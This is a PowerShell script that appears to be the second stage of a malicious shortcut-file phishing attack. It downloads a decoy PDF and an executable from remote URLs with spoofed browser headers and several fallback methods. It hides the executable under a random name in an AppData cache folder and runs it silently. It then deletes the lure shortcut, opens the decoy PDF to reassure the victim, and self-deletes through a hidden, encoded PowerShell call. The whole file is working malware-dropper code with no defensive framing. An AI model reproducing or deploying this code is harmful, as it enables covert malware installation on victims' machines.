# Function to force delete files
function Force-FileDelete {
    param([string]$Path)
    if ([System.IO.File]::Exists($Path)) {
        try {
            attrib -r -h -s $Path -ErrorAction SilentlyContinue
            [System.IO.File]::Delete($Path)
            "Deleted: $Path" | Out-File $DebugLog -Append
        } catch {
            "Delete failed: $Path - $_" | Out-File $DebugLog -Append
        }
    }
}

# Function to run PowerShell in hidden window
function Invoke-HiddenPowerShell {
    param([string]$ScriptBlock)
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptBlock))
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden -ErrorAction SilentlyContinue
}

# Function to open PDF with multiple fallbacks
function Open-PDF {
    param([string]$PdfPath)
    
    "Attempting to open PDF: $PdfPath" | Out-File $DebugLog -Append
    
    if (-not (Test-Path $PdfPath)) {
        "PDF file does not exist: $PdfPath" | Out-File $DebugLog -Append
        return $false
    }
    
    "PDF file exists. Size: $((Get-Item $PdfPath).Length) bytes" | Out-File $DebugLog -Append
    
    try {
        $fileStream = [System.IO.File]::OpenRead($PdfPath)
        $buffer = New-Object byte[] 5
        $fileStream.Read($buffer, 0, 5) | Out-Null
        $fileStream.Close()
        $header = [System.Text.Encoding]::ASCII.GetString($buffer)
        "PDF header: $header" | Out-File $DebugLog -Append
        if ($header -ne "%PDF-") {
            "WARNING: File is not a valid PDF!" | Out-File $DebugLog -Append
        }
    } catch {
        "Error reading PDF header: $_" | Out-File $DebugLog -Append
    }
    
    # Method 1: Start-Process (default)
    try {
        Start-Process -FilePath $PdfPath -ErrorAction Stop
        "Opened with Start-Process" | Out-File $DebugLog -Append
        return $true
    } catch {
        "Start-Process failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 2: Use ShellExecute
    try {
        $shell = New-Object -ComObject Shell.Application
        $shell.ShellExecute($PdfPath)
        "Opened with ShellExecute" | Out-File $DebugLog -Append
        return $true
    } catch {
        "ShellExecute failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 3: Use Invoke-Item
    try {
        Invoke-Item -Path $PdfPath -ErrorAction Stop
        "Opened with Invoke-Item" | Out-File $DebugLog -Append
        return $true
    } catch {
        "Invoke-Item failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 4: Open with default browser as fallback
    try {
        Start-Process "chrome.exe" -ArgumentList "`"$PdfPath`"" -ErrorAction SilentlyContinue
        "Opened with Chrome" | Out-File $DebugLog -Append
        return $true
    } catch {
        "Chrome failed: $_" | Out-File $DebugLog -Append
    }
    
    try {
        Start-Process "msedge.exe" -ArgumentList "`"$PdfPath`"" -ErrorAction SilentlyContinue
        "Opened with Edge" | Out-File $DebugLog -Append
        return $true
    } catch {
        "Edge failed: $_" | Out-File $DebugLog -Append
    }
    
    try {
        Start-Process "firefox.exe" -ArgumentList "`"$PdfPath`"" -ErrorAction SilentlyContinue
        "Opened with Firefox" | Out-File $DebugLog -Append
        return $true
    } catch {
        "Firefox failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 5: Use cmd.exe start command
    try {
        Start-Process cmd.exe -ArgumentList "/c start `"`" `"$PdfPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
        "Opened with cmd start" | Out-File $DebugLog -Append
        return $true
    } catch {
        "cmd start failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 6: Try using Acrobat/Reader directly
    try {
        $acroRd = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\AcroRd32.exe" -ErrorAction SilentlyContinue
        if ($acroRd) {
            Start-Process $acroRd.'(default)' -ArgumentList $PdfPath
            "Opened with Acrobat Reader" | Out-File $DebugLog -Append
            return $true
        }
    } catch {}
    
    try {
        $acroEx = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Acrobat.exe" -ErrorAction SilentlyContinue
        if ($acroEx) {
            Start-Process $acroEx.'(default)' -ArgumentList $PdfPath
            "Opened with Acrobat" | Out-File $DebugLog -Append
            return $true
        }
    } catch {}
    
    "All PDF opening methods failed" | Out-File $DebugLog -Append
    return $false
}

# Main execution function
function CODE_SEG {
    param(
        [Parameter(Mandatory)][string] $Name,
        [Parameter(Mandatory)][string] $PdfURL,
        [Parameter(Mandatory)][string] $InstallerURL
    )
    
    "CODE_SEG started" | Out-File $DebugLog -Append
    "Name: $Name" | Out-File $DebugLog -Append
    "PDF URL: $PdfURL" | Out-File $DebugLog -Append
    "EXE URL: $InstallerURL" | Out-File $DebugLog -Append
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    $CurrentDir = (Get-Location).Path
    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
    
    "CurrentDir: $CurrentDir" | Out-File $DebugLog -Append
    "InkPath: $InkPath" | Out-File $DebugLog -Append
    "PdfPath: $PdfPath" | Out-File $DebugLog -Append
    
    # Download PDF with user agent spoofing and retry
    $headers = @{
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        "Accept-Language" = "en-US,en;q=0.5"
        "Referer" = "https://www.google.com/"
    }
    
    # Try multiple download methods for PDF
    $pdfDownloaded = $false
    
    # Method 1: Invoke-WebRequest
    try {
        "Downloading PDF with Invoke-WebRequest..." | Out-File $DebugLog -Append
        $response = Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -Headers $headers -ErrorAction Stop
        "Response status: $($response.StatusCode)" | Out-File $DebugLog -Append
        if (Test-Path $PdfPath) { 
            $pdfDownloaded = $true
            "PDF downloaded with Invoke-WebRequest. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
        }
    } catch {
        "Invoke-WebRequest failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 2: WebClient
    if (-not $pdfDownloaded) {
        try {
            "Downloading PDF with WebClient..." | Out-File $DebugLog -Append
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($PdfURL, $PdfPath)
            if (Test-Path $PdfPath) { 
                $pdfDownloaded = $true
                "PDF downloaded with WebClient. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "WebClient failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    # Method 3: BITS Transfer
    if (-not $pdfDownloaded) {
        try {
            "Downloading PDF with BITS..." | Out-File $DebugLog -Append
            Start-BitsTransfer -Source $PdfURL -Destination $PdfPath -ErrorAction Stop
            if (Test-Path $PdfPath) { 
                $pdfDownloaded = $true
                "PDF downloaded with BITS. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "BITS failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    # Method 4: curl.exe
    if (-not $pdfDownloaded) {
        try {
            "Downloading PDF with curl..." | Out-File $DebugLog -Append
            & curl.exe -L -o $PdfPath $PdfURL --silent --show-error
            if (Test-Path $PdfPath) { 
                $pdfDownloaded = $true
                "PDF downloaded with curl. Size: $((Get-Item $PdfPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "curl failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    if (-not $pdfDownloaded) {
        "PDF download FAILED with all methods" | Out-File $DebugLog -Append
    } else {
        "PDF downloaded successfully" | Out-File $DebugLog -Append
        try {
            $fileStream = [System.IO.File]::OpenRead($PdfPath)
            $buffer = New-Object byte[] 5
            $fileStream.Read($buffer, 0, 5) | Out-Null
            $fileStream.Close()
            $header = [System.Text.Encoding]::ASCII.GetString($buffer)
            "Downloaded PDF header: $header" | Out-File $DebugLog -Append
            if ($header -ne "%PDF-") {
                "WARNING: Downloaded file is NOT a valid PDF!" | Out-File $DebugLog -Append
            }
        } catch {
            "Error checking downloaded PDF: $_" | Out-File $DebugLog -Append
        }
    }
    
    # Download EXE with random name to hidden location
    $InstallerURI = [System.Uri]$InstallerURL
    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
    if ([string]::IsNullOrEmpty($InstallerExt)) { $InstallerExt = ".exe" }
    $RandomFileName = [System.IO.Path]::GetRandomFileName()
    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
    
    $InstallerPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft", "Windows", "Caches", $RandomFileName)
    
    "InstallerPath: $InstallerPath" | Out-File $DebugLog -Append
    "InstallerExt: $InstallerExt" | Out-File $DebugLog -Append
    
    $cacheDir = [System.IO.Path]::GetDirectoryName($InstallerPath)
    if (-not (Test-Path $cacheDir)) {
        New-Item -Path $cacheDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        "Created cache directory: $cacheDir" | Out-File $DebugLog -Append
    }
    
    # Download EXE with multiple methods
    $exeDownloaded = $false
    
    # Method 1: Invoke-WebRequest
    try {
        "Downloading EXE with Invoke-WebRequest..." | Out-File $DebugLog -Append
        $response = Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -Headers $headers -ErrorAction Stop
        "EXE Response status: $($response.StatusCode)" | Out-File $DebugLog -Append
        if (Test-Path $InstallerPath) { 
            $exeDownloaded = $true
            "EXE downloaded with Invoke-WebRequest. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
        }
    } catch {
        "EXE Invoke-WebRequest failed: $_" | Out-File $DebugLog -Append
    }
    
    # Method 2: WebClient
    if (-not $exeDownloaded) {
        try {
            "Downloading EXE with WebClient..." | Out-File $DebugLog -Append
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($InstallerURL, $InstallerPath)
            if (Test-Path $InstallerPath) { 
                $exeDownloaded = $true
                "EXE downloaded with WebClient. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "EXE WebClient failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    # Method 3: BITS Transfer
    if (-not $exeDownloaded) {
        try {
            "Downloading EXE with BITS..." | Out-File $DebugLog -Append
            Start-BitsTransfer -Source $InstallerURL -Destination $InstallerPath -ErrorAction Stop
            if (Test-Path $InstallerPath) { 
                $exeDownloaded = $true
                "EXE downloaded with BITS. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "EXE BITS failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    # Method 4: curl.exe
    if (-not $exeDownloaded) {
        try {
            "Downloading EXE with curl..." | Out-File $DebugLog -Append
            & curl.exe -L -o $InstallerPath $InstallerURL --silent --show-error
            if (Test-Path $InstallerPath) { 
                $exeDownloaded = $true
                "EXE downloaded with curl. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "EXE curl failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    # Method 5: Use System.Net.Http.HttpClient
    if (-not $exeDownloaded) {
        try {
            "Downloading EXE with HttpClient..." | Out-File $DebugLog -Append
            $httpClient = New-Object System.Net.Http.HttpClient
            $httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
            $response = $httpClient.GetByteArrayAsync($InstallerURL).Result
            [System.IO.File]::WriteAllBytes($InstallerPath, $response)
            if (Test-Path $InstallerPath) { 
                $exeDownloaded = $true
                "EXE downloaded with HttpClient. Size: $((Get-Item $InstallerPath).Length)" | Out-File $DebugLog -Append
            }
        } catch {
            "EXE HttpClient failed: $_" | Out-File $DebugLog -Append
        }
    }
    
    if ($exeDownloaded) {
        "EXE downloaded successfully. Executing..." | Out-File $DebugLog -Append
        Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
        attrib +h +s $InstallerPath -ErrorAction SilentlyContinue
        
        # Execute EXE silently
        $Process = Start-Process -FilePath $InstallerPath -ArgumentList "/silent" -Wait -PassThru -WindowStyle Hidden
        "EXE executed. Exit code: $($Process.ExitCode)" | Out-File $DebugLog -Append
        
        # Clean up EXE
        try {
            attrib -h -s $InstallerPath -ErrorAction SilentlyContinue
            [System.IO.File]::Delete($InstallerPath)
            "EXE cleaned up" | Out-File $DebugLog -Append
        } catch {}
    } else {
        "EXE download FAILED with all methods" | Out-File $DebugLog -Append
    }
    
    # DELETE THE .LNK FILE AFTER RUNNING THE EXE
    Force-FileDelete -Path $InkPath
    
    # OPEN THE PDF FILE (REPLACES THE .LNK FILE)
    if ($pdfDownloaded -and (Test-Path $PdfPath)) {
        "Attempting to open PDF..." | Out-File $DebugLog -Append
        Start-Sleep -Seconds 2
        $opened = Open-PDF -PdfPath $PdfPath
        "PDF opened: $opened" | Out-File $DebugLog -Append
    } else {
        "PDF not downloaded or doesn't exist, cannot open" | Out-File $DebugLog -Append
    }
    
    # Self-delete script
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        Invoke-HiddenPowerShell -ScriptBlock "Start-Sleep -Seconds 5; Remove-Item -Path '$scriptPath' -Force -ErrorAction SilentlyContinue"
    }
    
    "CODE_SEG completed" | Out-File $DebugLog -Append
}
